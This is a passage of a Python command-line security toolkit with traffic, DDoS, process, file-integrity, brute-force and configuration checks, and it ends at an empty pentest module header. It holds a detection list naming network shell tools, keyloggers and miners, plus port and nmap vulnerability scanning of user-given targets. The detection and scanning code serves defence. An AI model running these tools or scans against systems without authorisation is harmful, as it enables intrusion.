                print(f"  {RED}{SYM_WARN} PORT SCAN DETECTED from {c(src, Fore.RED)} ({len(ports)} ports){RESET}")
                add_log_alert("CRITICAL", "Port Scan Detector", f"Port scan from {src}: {len(ports)} ports")
            else:
                print(f"  {c(f'{src:15s}', Fore.GREEN)} contacted {c(str(len(ports)), Fore.CYAN)} ports")

        if not connections:
            print(f"  {YELLOW}No TCP connections captured.{RESET}")

    except PermissionError:
        print(f"  {RED}{SYM_X} Root privileges required.{RESET}")
    except Exception as e:
        print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    elapsed = time.time() - start
    print(f"\n  {c(SYM_CHECK + f' Monitored for {elapsed:.0f}s', Fore.GREEN)}")
    print()


def net_ddos_detect():
    header_box("DDoS Detection", Fore.RED)
    if not _check_root(require_scapy=True):
        return
    system = platform.system().lower()
    ifaces = _detect_interfaces()
    default_iface = ifaces[0] if ifaces else ("eth0" if system == "linux" else "en0")
    iface = input(f"  {c(f'Interface (default {default_iface}) {SYM_PROMPT} ', Fore.CYAN)}").strip() or default_iface
    duration = input(f"  {c(f'Monitor duration (seconds, default 20) {SYM_PROMPT} ', Fore.CYAN)}").strip()
    duration = int(duration) if duration.isdigit() else 20
    rate_threshold = input(f"  {c(f'Packet rate threshold (pkts/sec, default 100) {SYM_PROMPT} ', Fore.CYAN)}").strip()
    rate_threshold = int(rate_threshold) if rate_threshold.isdigit() else 100

    print(f"\n  {c(f'DDoS detection on {iface} ({duration}s)...', Fore.RED)}")
    print(f"  {c(f'Threshold: >{rate_threshold} pkts/sec from same IP', Fore.YELLOW)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    packet_counts = defaultdict(int)
    start = time.time()
    last_report = start
    total_packets = 0

    try:
        if HAS_SCAPY:
            def count_pkt(pkt):
                if pkt.haslayer(scapy.IP):
                    packet_counts[pkt[scapy.IP].src] += 1
                    nonlocal total_packets
                    total_packets += 1

            scapy.sniff(iface=iface, prn=count_pkt, timeout=duration, store=False)
        else:
            if system == "linux":
                sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
                sock.settimeout(0.5)
                sock.bind((iface, 0))
                while time.time() - start < duration:
                    try:
                        data, _ = sock.recvfrom(65535)
                        total_packets += 1
                        if time.time() - last_report >= 1:
                            rate = total_packets / (time.time() - start)
                            sys.stdout.write(f"\r  {c(f'Rate: {rate:.1f} pkts/sec', Fore.CYAN)}  {c(f'Total: {total_packets}', Fore.GREEN)}  ")
                            sys.stdout.flush()
                            last_report = time.time()
                    except socket.timeout:
                        continue
                sock.close()
            else:
                print(f"  {YELLOW}Packet sniffing requires scapy on this platform.{RESET}")

        print()
        elapsed = time.time() - start
        rate = total_packets / elapsed if elapsed > 0 else 0

        print(f"\n  {c('Summary:', Fore.CYAN)}")
        print(f"    Total packets: {c(str(total_packets), Fore.GREEN)}")
        print(f"    Duration:      {c(f'{elapsed:.1f}s', Fore.CYAN)}")
        print(f"    Avg rate:      {c(f'{rate:.1f} pkts/sec', Fore.YELLOW)}")

        if rate > rate_threshold:
            print(f"\n  {RED}{SYM_WARN} HIGH TRAFFIC RATE DETECTED: {rate:.1f} pkts/sec{RESET}")
            add_log_alert("CRITICAL", "DDoS Detector", f"High traffic rate: {rate:.1f} pkts/sec")

        if packet_counts:
            top = sorted(packet_counts.items(), key=lambda x: -x[1])[:5]
            print(f"\n  {c('Top talkers:', Fore.CYAN)}")
            for ip, count in top:
                pct = count / total_packets * 100 if total_packets > 0 else 0
                bar = SYM_BLOCK_FULL * min(int(pct / 5), 20)
                print(f"    {c(f'{ip:15s}', Fore.GREEN)} {c(f'{count:6d}', Fore.CYAN)} {c(f'({pct:.1f}%)', Fore.YELLOW)} {c(bar, Fore.GREEN)}")

    except PermissionError:
        print(f"  {RED}{SYM_X} Root privileges required.{RESET}")
    except Exception as e:
        print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    print()


# ──────────────────────────────────────────────────────────
#  MODULE 2: ENDPOINT SECURITY
# ──────────────────────────────────────────────────────────

ENDPOINT_HOOKS = []


def ep_process_monitor():
    header_box("Process Monitor", Fore.MAGENTA)
    if not HAS_PSUTIL:
        print(f"  {RED}{SYM_X} psutil required. Install: pip install psutil{RESET}")
        return

    sort_by = input(f"  {c(f'Sort by (cpu/mem/name, default cpu) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower() or "cpu"
    count = input(f"  {c(f'Number of processes (default 20) {SYM_PROMPT} ', Fore.CYAN)}").strip()
    count = int(count) if count.isdigit() else 20

    print(f"\n  {c(f'Top {count} processes by {sort_by}:', Fore.MAGENTA)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    procs = []
    for proc in psutil.process_iter(["pid", "name", "cpu_percent", "memory_percent", "status"]):
        try:
            procs.append(proc.info)
        except Exception:
            pass

    if sort_by == "mem":
        procs.sort(key=lambda x: x.get("memory_percent", 0) or 0, reverse=True)
    else:
        procs.sort(key=lambda x: x.get("cpu_percent", 0) or 0, reverse=True)

    print(f"  {c('PID', Fore.CYAN):>8s} {'CPU%':>6s} {'MEM%':>6s} {'Status':>12s}  Name")
    print(f"  {SYM_LINE_H*50}")
    for p in procs[:count]:
        pid = p.get("pid", 0)
        cpu = p.get("cpu_percent", 0) or 0
        mem = p.get("memory_percent", 0) or 0
        status = p.get("status", "?") or "?"
        name = p.get("name", "?") or "?"
        cpu_color = Fore.RED if cpu > 50 else Fore.YELLOW if cpu > 10 else Fore.GREEN
        mem_color = Fore.RED if mem > 10 else Fore.YELLOW if mem > 5 else Fore.GREEN
        print(f"  {c(f'{pid:>7d}', Fore.CYAN)} {c(f'{cpu:>5.1f}', cpu_color)} {c(f'{mem:>5.1f}', mem_color)} {c(f'{status:>12s}', Fore.YELLOW)}  {c(name, Fore.GREEN)}")

    print()


SUSPICIOUS_PROCESS_NAMES = [
    "nc", "netcat", "ncat", "nmap", "zenmap", "masscan", "zmap",
    "hydra", "medusa", "john", "hashcat", "aircrack", "kismet",
    "tshark", "tcpdump", "ettercap", "bettercap", "driftnet",
    "metasploit", "msfconsole", "msfvenom", "veil",
    "sqlmap", "sqlninja", "havij", "pangolin",
    "beef", "beef-xss", "xsser",
    "proxychains", "tor", "vidalia",
    "cryptomining", "minerd", "xmrig", "cpuminer",
    "socat", "sbd", "cryptcat", "pwncat",
    "nikto", "wpscan", "joomscan", "droopescan",
    "dirb", "dirbuster", "gobuster", "wfuzz", "ffuf",
    "burp", "burpsuite",
    "wireshark", "dumpcap",
    "keylogger", "logkeys", "lkl",
    "backdoor", "rootkit", "rkit",
]


def ep_suspicious_processes():
    header_box("Suspicious Process Detector", Fore.MAGENTA)
    if not HAS_PSUTIL:
        print(f"  {RED}{SYM_X} psutil required. Install: pip install psutil{RESET}")
        return

    print(f"  {c('Scanning for suspicious processes...', Fore.MAGENTA)}")
    print(f"  {c(f'Known bad patterns: {len(SUSPICIOUS_PROCESS_NAMES)}', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    found = []
    for proc in psutil.process_iter(["pid", "name", "cmdline", "username"]):
        try:
            info = proc.info
            name = (info.get("name") or "").lower()
            cmdline = " ".join(info.get("cmdline") or [])
            combined = name + " " + cmdline.lower()

            for pattern in SUSPICIOUS_PROCESS_NAMES:
                if pattern.lower() in combined:
                    found.append((info.get("pid", 0), info.get("name", "?"), info.get("username", "?"), pattern))
                    break
        except Exception:
            pass

    if found:
        print(f"  {RED}{SYM_WARN} Found {len(found)} suspicious processes!{RESET}")
        for pid, name, user, pattern in found:
            print(f"    {c(f'PID {pid:>6d}', Fore.RED)} {c(name, Fore.YELLOW):20s} user={c(user, Fore.CYAN)} matched: {c(pattern, Fore.GREEN)}")
            add_log_alert("WARN", "Endpoint Security", f"Suspicious process: {name} (PID {pid}) matched pattern {pattern}")
    else:
        print(f"  {GREEN}{SYM_CHECK} No suspicious processes found.{RESET}")

    print()


def ep_file_integrity():
    header_box("File Integrity Checker", Fore.MAGENTA)
    path = input(f"  {c(f'Directory to monitor {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not path or not os.path.isdir(path):
        print(f"  {RED}{SYM_X} Invalid directory.{RESET}")
        return

    mode = input(f"  {c(f'Mode: (s)napshot or (c)heck baseline {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
    baseline_file = os.path.join(path, ".integrity_baseline.json")

    if mode == "s":
        checksums = {}
        print(f"  {c('Creating integrity snapshot...', Fore.CYAN)}")
        for root, dirs, files in os.walk(path):
            for fname in files:
                fpath = os.path.join(root, fname)
                try:
                    with open(fpath, "rb") as f:
                        content = f.read()
                    import hashlib
                    h = hashlib.sha256(content).hexdigest()
                    checksums[fpath] = h
                except Exception:
                    pass
        with open(baseline_file, "w") as f:
            json.dump(checksums, f, indent=2)
        print(f"  {GREEN}{SYM_CHECK} Baseline saved: {baseline_file} ({len(checksums)} files){RESET}")

    elif mode == "c":
        if not os.path.exists(baseline_file):
            print(f"  {RED}{SYM_X} No baseline found. Run snapshot first.{RESET}")
            return
        with open(baseline_file) as f:
            baseline = json.load(f)

        print(f"  {c('Verifying integrity...', Fore.CYAN)}")
        import hashlib
        changes = []
        for fpath, old_hash in baseline.items():
            if not os.path.exists(fpath):
                changes.append((fpath, "DELETED", ""))
                continue
            try:
                with open(fpath, "rb") as f:
                    content = f.read()
                new_hash = hashlib.sha256(content).hexdigest()
                if new_hash != old_hash:
                    changes.append((fpath, "MODIFIED", old_hash[:16]))
            except Exception:
                changes.append((fpath, "ACCESS ERROR", ""))

        print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
        if changes:
            print(f"  {RED}{SYM_WARN} {len(changes)} changes detected!{RESET}")
            for fpath, change_type, old in changes:
                color = Fore.RED if change_type == "DELETED" else Fore.YELLOW
                print(f"    {c(f'[{change_type:8s}]', color)} {c(fpath, Fore.GREEN)}")
                add_log_alert("WARN", "File Integrity", f"File {change_type}: {fpath}")
        else:
            print(f"  {GREEN}{SYM_CHECK} All files intact.{RESET}")
    else:
        print(f"  {RED}{SYM_X} Invalid mode (s/c).{RESET}")
    print()


def ep_network_connections():
    header_box("Network Connection Monitor", Fore.MAGENTA)
    if not HAS_PSUTIL:
        print(f"  {RED}{SYM_X} psutil required. Install: pip install psutil{RESET}")
        return

    filters = input(f"  {c(f'Filter (all/listen/estab, default all) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower() or "all"

    print(f"\n  {c('Active network connections:', Fore.MAGENTA)}")
    print(f"  {c(SYM_LINE_H*55, Fore.CYAN)}")

    try:
        connections = psutil.net_connections()
        count = 0
        for conn in connections:
            status = conn.status.lower() if conn.status else "?"
            if filters == "listen" and "listen" not in status:
                continue
            if filters == "estab" and "established" not in status:
                continue

            laddr = f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "?:?"
            raddr = f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "?:?"
            pid = conn.pid or 0
            proc_name = ""
            try:
                proc_name = psutil.Process(pid).name() if pid else ""
            except Exception:
                pass

            status_color = Fore.GREEN if "established" in status else Fore.YELLOW if "listen" in status else Fore.CYAN
            print(f"  {c(f'{status:>12s}', status_color)} {c(f'{laddr:22s}', Fore.GREEN)} {SYM_ARROW} {c(f'{raddr:22s}', Fore.CYAN)} {c(f'PID {pid}', Fore.YELLOW)} {c(proc_name, Fore.MAGENTA)}")
            count += 1

        print(f"\n  {c(f'Total connections: {count}', Fore.GREEN)}")
    except Exception as e:
        print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    print()


# ──────────────────────────────────────────────────────────
#  MODULE 3: VULNERABILITY MANAGEMENT
# ──────────────────────────────────────────────────────────

def vuln_advanced_scan():
    header_box("Advanced Port Scanner", Fore.BLUE)
    target = input(f"  {c(f'Enter IP or domain {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not target:
        print(f"  {RED}No target.{RESET}")
        return

    try:
        socket.inet_aton(target)
        ip = target
    except OSError:
        try:
            ip = socket.gethostbyname(target)
            print(f"  {GREEN}{SYM_CHECK} Resolved: {target} {SYM_ARROW} {ip}{RESET}")
        except Exception:
            print(f"  {RED}{SYM_X} Could not resolve.{RESET}")
            return

    print(f"\n  {c('Scan mode:', Fore.CYAN)}")
    print(f"  {c('[1]', Fore.GREEN)}  Fast (top 30 ports)")
    print(f"  {c('[2]', Fore.GREEN)}  Normal (top 1000)")
    print(f"  {c('[3]', Fore.GREEN)}  Service version scan (nmap -sV)")
    scan_mode = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()

    has_nmap = shutil.which("nmap")
    open_ports = []

    if has_nmap and scan_mode == "3":
        print(f"\n  {c('Running nmap service version scan...', Fore.CYAN)}")
        try:
            result = subprocess.run(
                ["nmap", "-sV", "--version-intensity", "2", "-T4", ip],
                capture_output=True, text=True, timeout=300
            )
            print(f"\n  {c('Results:', Fore.CYAN)}")
            for line in result.stdout.splitlines():
                if re.search(r'(tcp|udp)\s+open', line):
                    print(f"    {c(line, Fore.GREEN)}")
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")

    elif has_nmap and scan_mode == "2":
        print(f"\n  {c('Scanning top 1000 ports...', Fore.CYAN)}")
        try:
            result = subprocess.run(
                ["nmap", "-T4", "--open", ip],
                capture_output=True, text=True, timeout=300
            )
            for line in result.stdout.splitlines():
                m = re.match(r'^(\d+)/tcp\s+open', line)
                if m:
                    port = int(m.group(1))
                    try:
                        svc = socket.getservbyport(port)
                    except OSError:
                        svc = "?"
                    open_ports.append((port, svc))
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    else:
        targets = [22, 21, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995,
                   1433, 1521, 2049, 3306, 3389, 5432, 5900, 5985, 5986, 6379, 8080,
                   8443, 9000, 9090, 9200, 27017]
        print(f"\n  {c(f'Scanning {len(targets)} common ports...', Fore.CYAN)}")

        def check(port, results, idx):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5)
                r = s.connect_ex((ip, port))
                s.close()
                results[idx] = port if r == 0 else None
            except Exception:
                results[idx] = None

        batch_size = 50
        for i in range(0, len(targets), batch_size):
            batch = targets[i:i + batch_size]
            batch_results = {}
            with ThreadPoolExecutor(max_workers=50) as ex:
                futures = {ex.submit(check, p, batch_results, j): j for j, p in enumerate(batch)}
                for f in as_completed(futures):
                    f.result()
            for idx in batch_results:
                if batch_results[idx] is not None:
                    p = batch_results[idx]
                    try:
                        svc = socket.getservbyport(p)
                    except OSError:
                        svc = "?"
                    open_ports.append((p, svc))

    print(f"\n  {c('Open Ports:', Fore.GREEN)}")
    if open_ports:
        for port, svc in sorted(set(open_ports)):
            print(f"    {SYM_LINE_V}{SYM_LINE_H} {c(f'{port:5d}', Fore.GREEN)} ({c(svc, Fore.CYAN)})")
    else:
        print(f"    {YELLOW}No open ports detected.{RESET}")

    print()


CVE_CACHE = {}


def vuln_cve_lookup():
    header_box("CVE Lookup", Fore.BLUE)
    keyword = input(f"  {c(f'Enter software name or CVE ID {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not keyword:
        print(f"  {RED}No input.{RESET}")
        return

    print(f"\n  {c(f'Looking up CVEs for: {keyword}', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    try:
        if keyword.upper().startswith("CVE-"):
            resp = requests.get(f"https://cve.circl.lu/api/cve/{keyword.upper()}", timeout=15)
            if resp.status_code == 200:
                data = resp.json()
                info_lines = [
                    f"  CVE ID:      {c(data.get('id', 'N/A'), Fore.RED)}",
                    f"  Summary:     {c((data.get('description', 'N/A') or 'N/A')[:120], Fore.GREEN)}",
                    f"  CVSS Score:  {c(str(data.get('cvss', 'N/A')), Fore.YELLOW)}",
                    f"  Published:   {c(data.get('Published', 'N/A'), Fore.CYAN)}",
                    f"  Modified:    {c(data.get('last-modified', 'N/A'), Fore.CYAN)}",
                ]
                if data.get("access"):
                    info_lines.append(f"  Vector:      {c(data['access'].get('vector', 'N/A'), Fore.MAGENTA)}")
                info_box("CVE Details", info_lines, Fore.RED)
            else:
                print(f"  {YELLOW}CVE not found.{RESET}")
        else:
            resp = requests.get(f"https://cve.circl.lu/api/search/{keyword}", timeout=15)
            if resp.status_code == 200:
                data = resp.json()
                if isinstance(data, list):
                    print(f"  {c(f'Found {len(data)} CVEs', Fore.GREEN)}")
                    for item in data[:10]:
                        cve_id = item.get("id", "?")
                        score = item.get("cvss", "?")
                        desc = (item.get("description", "") or "")[:80]
                        score_color = Fore.RED if (isinstance(score, (int, float)) and score >= 7) else Fore.YELLOW
                        print(f"    {c(cve_id, Fore.RED)} {c(f'CVSS:{score}', score_color)} {c(desc, Fore.GREEN)}")
                else:
                    print(f"  {YELLOW}Unexpected response format.{RESET}")
            else:
                print(f"  {YELLOW}No results.{RESET}")
    except Exception as e:
        print(f"  {RED}{SYM_X} Lookup error: {e}{RESET}")
    print()


def vuln_assessment():
    header_box("Basic Vulnerability Assessment", Fore.BLUE)
    target = input(f"  {c(f'Enter IP or domain {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not target:
        print(f"  {RED}No target.{RESET}")
        return

    try:
        socket.inet_aton(target)
        ip = target
    except OSError:
        try:
            ip = socket.gethostbyname(target)
            print(f"  {GREEN}{SYM_CHECK} Resolved: {target} {SYM_ARROW} {ip}{RESET}")
        except Exception:
            print(f"  {RED}{SYM_X} Could not resolve.{RESET}")
            return

    print(f"\n  {c('Running vulnerability assessment...', Fore.BLUE)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    findings = []
    has_nmap = shutil.which("nmap")

    if has_nmap:
        try:
            is_private = ip.startswith(("10.", "172.16.", "172.17.", "172.18.", "172.19.",
                "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.",
                "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.",
                "192.168.", "127."))
            script = "vuln" if is_private else "vulners"
            print(f"  {YELLOW}Running nmap {script} scripts (up to 90s)...{RESET}")
            r = subprocess.run(
                ["nmap", "-sV", "--script", script, "-T4", ip],
                capture_output=True, text=True, timeout=90
            )
            for line in r.stdout.splitlines():
                if re.search(r'(VULNERABLE|CVE-\d|vulners:)', line, re.IGNORECASE):
                    findings.append(line.strip())
                    add_log_alert("HIGH", "Vuln Assessment", f"Vulnerability found on {ip}: {line.strip()}")
        except subprocess.TimeoutExpired:
            print(f"  {YELLOW}nmap timed out (90s). Showing partial results.{RESET}")

    if findings:
        print(f"\n  {RED}{SYM_WARN} Potential vulnerabilities:{RESET}")
        for finding in findings[:20]:
            print(f"    {SYM_LINE_V}{SYM_LINE_H} {c(finding, Fore.RED)}")
    else:
        print(f"\n  {GREEN}{SYM_CHECK} No obvious vulnerabilities detected via nmap vuln scripts.{RESET}")

    print(f"\n  {c('Basic security checks:', Fore.CYAN)}")
    checks = [
        ("SSH (22)", is_port_open(ip, 22)),
        ("HTTP (80)", is_port_open(ip, 80)),
        ("HTTPS (443)", is_port_open(ip, 443)),
        ("MySQL (3306)", is_port_open(ip, 3306)),
        ("RDP (3389)", is_port_open(ip, 3389)),
        ("Redis (6379)", is_port_open(ip, 6379)),
        ("MongoDB (27017)", is_port_open(ip, 27017)),
    ]
    for name, open_status in checks:
        if open_status:
            print(f"    {c(SYM_X, Fore.RED)} {name}: EXPOSED")
            add_log_alert("WARN", "Vuln Assessment", f"Service exposed: {name} on {ip}")
        else:
            print(f"    {c(SYM_CHECK, Fore.GREEN)} {name}: filtered/closed")
    print()


def is_port_open(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        r = s.connect_ex((ip, port))
        s.close()
        return r == 0
    except Exception:
        return False


def vuln_config_check():
    header_box("Security Configuration Checker", Fore.BLUE)
    print(f"  {c('Checking local system security posture...', Fore.BLUE)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    issues = []
    system = platform.system().lower()

    if system == "linux":
        try:
            with open("/etc/ssh/sshd_config") as f:
                ssh_config = f.read()
            if "PermitRootLogin yes" in ssh_config:
                issues.append("SSH root login enabled")
            if "PasswordAuthentication yes" in ssh_config:
                issues.append("SSH password authentication enabled")
        except Exception:
            pass

        try:
            import pwd
            for user in pwd.getpwall():
                if user.pw_uid == 0 and user.pw_name != "root":
                    issues.append(f"Non-root user with UID 0: {user.pw_name}")
        except Exception:
            pass

        try:
            r = subprocess.run(["iptables", "-L"], capture_output=True, text=True, timeout=5)
            if "Chain INPUT (policy ACCEPT)" in r.stdout:
                issues.append("Firewall: INPUT chain policy is ACCEPT (not DROP)")
        except Exception:
            pass

        try:
            r = subprocess.run(["sysctl", "net.ipv4.tcp_syncookies"], capture_output=True, text=True, timeout=5)
            if "= 0" in r.stdout:
                issues.append("SYN cookies disabled (DDoS mitigation off)")
        except Exception:
            pass

        try:
            r = subprocess.run(["sysctl", "net.ipv4.ip_forward"], capture_output=True, text=True, timeout=5)
            if "= 1" in r.stdout:
                issues.append("IP forwarding enabled (system may be routing)")
        except Exception:
            pass

        try:
            with open("/etc/hostname") as f:
                hn = f.read().strip()
            if hn == "localhost" or not hn:
                issues.append("Hostname not properly configured")
        except Exception:
            pass

    elif system == "darwin":
        try:
            r = subprocess.run(["sysctl", "net.inet.ip.forwarding"], capture_output=True, text=True, timeout=5)
            if "= 1" in r.stdout:
                issues.append("IP forwarding enabled")
        except Exception:
            pass
        try:
            r = subprocess.run(["sysctl", "net.inet.tcp.always_keepalive"], capture_output=True, text=True, timeout=5)
            if "= 0" in r.stdout:
                issues.append("TCP keepalive disabled")
        except Exception:
            pass
        try:
            r = subprocess.run(["/usr/libexec/ApplicationFirewall/socketfilterfw", "--getglobalstate"], capture_output=True, text=True, timeout=5)
            if "disabled" in r.stdout.lower():
                issues.append("macOS firewall is disabled")
        except Exception:
            pass

    elif system == "windows":
        try:
            r = subprocess.run(["netsh", "advfirewall", "show", "allprofiles"], capture_output=True, text=True, timeout=10, encoding="utf-8", errors="replace")
            if "OFF" in r.stdout:
                issues.append("Windows Firewall is off for one or more profiles")
        except Exception:
            pass
        issues.append("Run full config checks on Linux for deeper analysis")

    else:
        issues.append("Full checks only available on Linux")

    if issues:
        print(f"  {RED}{SYM_WARN} Configuration issues found:{RESET}")
        for issue in issues:
            print(f"    {SYM_LINE_V}{SYM_LINE_H} {c(issue, Fore.RED)}")
            add_log_alert("WARN", "Config Check", issue)
    else:
        print(f"  {GREEN}{SYM_CHECK} No critical configuration issues.{RESET}")
    print()


# ──────────────────────────────────────────────────────────
#  MODULE 4: DATA & ACCESS PROTECTION
# ──────────────────────────────────────────────────────────

def data_encrypt():
    header_box("File Encryption / Decryption", Fore.YELLOW)
    if not HAS_CRYPTO:
        print(f"  {RED}{SYM_X} cryptography library required. Install: pip install cryptography{RESET}")
        return

    mode = input(f"  {c(f'(e)ncrypt or (d)ecrypt {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
    filepath = input(f"  {c(f'File path {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not filepath or not os.path.exists(filepath):
        print(f"  {RED}{SYM_X} File not found.{RESET}")
        return

    password = input(f"  {c(f'Password {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not password:
        print(f"  {RED}{SYM_X} Password required.{RESET}")
        return

    salt = os.urandom(16) if mode == "e" else None

    if mode == "e":
        with open(filepath, "rb") as f:
            data = f.read()
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=600000)
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        cipher = Fernet(key)
        encrypted = cipher.encrypt(data)
        outpath = filepath + ".encrypted"
        with open(outpath, "wb") as f:
            f.write(struct.pack("!H", len(salt)) + salt + encrypted)

        print(f"  {GREEN}{SYM_CHECK} Encrypted: {outpath}{RESET}")
        confirm = input(f"  {YELLOW}{SYM_WARN} Delete original file? (yes/no) {SYM_PROMPT} {RESET}").strip().lower()
        if confirm == "yes":
            os.remove(filepath)
            print(f"  {YELLOW}Original file deleted: {filepath}{RESET}")
        else:
            print(f"  {GREEN}Original file preserved.{RESET}")
        add_log_alert("INFO", "Encryption", f"File encrypted: {filepath}")

    elif mode == "d":
        with open(filepath, "rb") as f:
            raw = f.read()
        salt_len = struct.unpack("!H", raw[:2])[0]
        salt = raw[2:2+salt_len]
        encrypted_data = raw[2+salt_len:]
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=600000)
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        cipher = Fernet(key)
        decrypted = cipher.decrypt(encrypted_data)
        outpath = filepath.replace(".encrypted", ".decrypted")
        if outpath == filepath:
            outpath = filepath + ".decrypted"
        with open(outpath, "wb") as f:
            f.write(decrypted)
        print(f"  {GREEN}{SYM_CHECK} Decrypted: {outpath}{RESET}")
        add_log_alert("INFO", "Decryption", f"File decrypted: {filepath}")


def data_password_strength():
    header_box("Password Strength Analyzer", Fore.YELLOW)
    try:
        import getpass
        password = getpass.getpass(f"  {c(f'Enter password to analyze {SYM_PROMPT} ', Fore.CYAN)}")
    except Exception:
        password = input(f"  {c(f'Enter password to analyze {SYM_PROMPT} ', Fore.CYAN)}")
    password = password.strip()
    if not password:
        print(f"  {RED}No password provided.{RESET}")
        return

    length = len(password)
    has_upper = bool(re.search(r'[A-Z]', password))
    has_lower = bool(re.search(r'[a-z]', password))
    has_digit = bool(re.search(r'\d', password))
    has_symbol = bool(re.search(r'[!@#$%^&*()_+\-=\[\]{};\'":\\|,.<>\/?`~]', password))
    has_space = " " in password

    score = 0
    if length >= 8: score += 25
    if length >= 12: score += 15
    if length >= 16: score += 10
    if has_upper: score += 10
    if has_lower: score += 10
    if has_digit: score += 10
    if has_symbol: score += 15
    if has_space: score += 5

    # Check against common patterns
    common = ["password", "123456", "qwerty", "admin", "letmein", "welcome", "monkey", "dragon",
              "master", "login", "abc123", "111111", "iloveyou", "sunshine", "princess"]
    is_common = password.lower() in common

    entropy = 0
    char_space = 0
    if has_lower: char_space += 26
    if has_upper: char_space += 26
    if has_digit: char_space += 10
    if has_symbol: char_space += 32
    if char_space > 0:
        entropy = length * (char_space.bit_length())

    info_lines = [
        f"  Length:       {c(str(length), Fore.CYAN)}",
        f"  Uppercase:    {c(SYM_CHECK if has_upper else SYM_X, Fore.GREEN if has_upper else Fore.RED)}",
        f"  Lowercase:    {c(SYM_CHECK if has_lower else SYM_X, Fore.GREEN if has_lower else Fore.RED)}",
        f"  Digits:       {c(SYM_CHECK if has_digit else SYM_X, Fore.GREEN if has_digit else Fore.RED)}",
        f"  Symbols:      {c(SYM_CHECK if has_symbol else SYM_X, Fore.GREEN if has_symbol else Fore.RED)}",
        f"  Entropy:      {c(f'{entropy} bits', Fore.CYAN)}",
        f"  Common:       {c(SYM_WARN + ' Yes' if is_common else SYM_CHECK + ' No', Fore.RED if is_common else Fore.GREEN)}",
    ]

    if score >= 80:
        grade = c(f"STRONG ({score}/100)", Fore.GREEN)
    elif score >= 50:
        grade = c(f"MODERATE ({score}/100)", Fore.YELLOW)
    else:
        grade = c(f"WEAK ({score}/100)", Fore.RED)

    info_lines.append(f"  Strength:     {grade}")

    info_box("Password Analysis", info_lines, Fore.YELLOW)
    print()


def data_bruteforce_detect():
    header_box("Brute-Force Detection", Fore.YELLOW)
    print(f"  {c('Checking for failed login attempts...', Fore.YELLOW)}")

    system = platform.system().lower()
    found = 0
    if system == "linux":
        log_files = ["/var/log/auth.log", "/var/log/secure", "/var/log/syslog"]
        for log_file in log_files:
            if os.path.exists(log_file):
                try:
                    with open(log_file) as f:
                        content = f.read()
                    failed = re.findall(r'(Failed password|authentication failure|Invalid user)', content, re.IGNORECASE)
                    if failed:
                        print(f"  {RED}{SYM_WARN} {log_file}: {len(failed)} failed attempts{RESET}")
                        found += len(failed)
                    ip_pattern = re.findall(r'Failed password for .* from (\S+)', content)
                    if ip_pattern:
                        ip_counts = defaultdict(int)
                        for ip in ip_pattern:
                            ip_counts[ip] += 1
                        print(f"  {c('Top attacking IPs:', Fore.CYAN)}")
                        for ip, count in sorted(ip_counts.items(), key=lambda x: -x[1])[:5]:
                            color = Fore.RED if count > 10 else Fore.YELLOW
                            print(f"    {c(ip, color)}: {c(str(count), Fore.CYAN)} attempts")
                except Exception:
                    pass
    elif system == "darwin":
        try:
            r = subprocess.run(["log", "show", "--predicate", 'eventMessage contains "Failed Password"', "--last", "1h"], capture_output=True, text=True, timeout=15)
            lines = [l for l in r.stdout.splitlines() if "Failed Password" in l]
            if lines:
                print(f"  {YELLOW}Failed password attempts found:{RESET}")
                for line in lines[:10]:
                    print(f"    {c(line.strip()[:120], Fore.RED)}")
                found = len(lines)
        except Exception:
            pass
    elif system == "windows":
        try:
            r = subprocess.run(["wevtutil", "qe", "Security", "/q:*[System[EventID=4625]]", "/c:10", "/f:text"], capture_output=True, text=True, timeout=15, encoding="utf-8", errors="replace")
            if r.stdout.strip():
                print(f"  {YELLOW}Failed Windows logins (last 10):{RESET}")
                for line in r.stdout.splitlines():
                    if "Account Name" in line or "Failure" in line:
                        print(f"    {c(line.strip()[:100], Fore.RED)}")
                        found += 1
        except Exception:
            print(f"  {YELLOW}Run as Administrator to read Security logs.{RESET}")
    else:
        print(f"  {YELLOW}Log analysis not fully supported on {system}.{RESET}")

    if found == 0:
        print(f"  {GREEN}{SYM_CHECK} No brute-force patterns detected.{RESET}")
    else:
        add_log_alert("WARN", "Bruteforce Detection", f"{found} total failed login attempts detected")
    print()


# ──────────────────────────────────────────────────────────
#  MODULE 5: ETHICAL HACKING & PENTEST
# ──────────────────────────────────────────────────────────

